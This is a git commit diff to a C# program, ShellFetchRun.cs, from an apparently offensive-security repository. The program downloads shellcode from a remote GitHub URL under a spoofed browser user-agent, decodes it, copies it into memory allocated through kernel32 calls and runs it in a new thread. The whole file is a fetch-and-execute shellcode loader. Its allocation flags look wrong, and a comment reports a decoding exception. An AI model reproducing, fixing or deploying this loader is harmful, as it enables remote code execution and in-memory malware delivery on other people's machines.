a54d51f735fbac9abc2c5c4503eb2c3223813cbc
Nihardobariya <41757004+Nihardobariya@users.noreply.github.com>
2021-02-05 01:50:21 -0500

    Add files via upload

--- ShellFetchRun.cs
+++ ShellFetchRun.cs
@@ -21,7 +21,10 @@ namespace ShellFetchRun
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, ulong flAllocationType, ulong flProtect);
 
         [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        static extern uint CreateThread(SECURITY_ATTRIBUTES lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, ulong dwCreationFlags, IntPtr lpThreadId);
+        static extern IntPtr CreateThread(SECURITY_ATTRIBUTES lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, ulong dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
         static void Main(string[] args)
         {
@@ -30,22 +33,24 @@ namespace ShellFetchRun
             
             client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75");
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
-            Stream data = client.OpenRead("https://raw.githubusercontent.com/Nihardobariya/offensive_cs/main/shellcode.raw");
+            Stream data = client.OpenRead("https://github.com/Nihardobariya/offensive_cs/raw/main/shellcode.raw");
             StreamReader reader = new StreamReader(data);
             
             string s = reader.ReadToEnd();
-            //byte[] arry = Convert.FromBase64String(s);
 
-            Console.WriteLine(s);
-            //Console.WriteLine(BitConverter.ToString(arry));
-
+            //Exception occuring at this line of not valid Base-64 string 
+            byte[] arry = Convert.FromBase64String(s);
 
             data.Close();
             reader.Close();
 
-            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)s.Length, 0x00002000, 0);
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)arry.Length, 0x00002000, 0);
 
-            uint temp = CreateThread(Security_Attributes, (uint)s.Length, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            Marshal.Copy(arry, 0, addr, arry.Length);
+
+            IntPtr th = CreateThread(Security_Attributes, (uint)arry.Length, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+            WaitForSingleObject(th, 0xFFFFFFFF);
 
         }
     }
